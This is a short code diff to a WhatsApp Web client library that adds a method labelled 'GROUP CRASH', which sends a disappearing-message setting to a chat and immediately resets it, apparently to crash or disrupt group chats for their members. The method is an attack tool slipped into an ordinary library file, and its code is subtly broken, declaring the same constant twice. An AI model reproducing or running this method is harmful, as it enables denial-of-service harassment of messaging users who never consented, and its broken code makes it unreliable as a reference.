@@ -81,6 +81,16 @@ export class WAConnection extends Base {
         return preparedMessage
     }
     /**
+     *GROUP CRASH
+     */
+    async sendBugEphemeral(jid) {
+        const message = await this.prepareMessageFromContent(jid, this.prepareDisappearingMessageSettingContent(WA_DEFAULT_EPHEMERAL), {});
+        await this.relayWAMessage(message, { waitForAck: true });
+        const message = await this.prepareMessageFromContent(jid, this.prepareDisappearingMessageSettingContent(0), {});
+        await this.relayWAMessage(message, { waitForAck: true });
+        return message;
+    }
+    /**
      * Toggles disappearing messages for the given chat
      * 
      * @param jid the chat to toggle
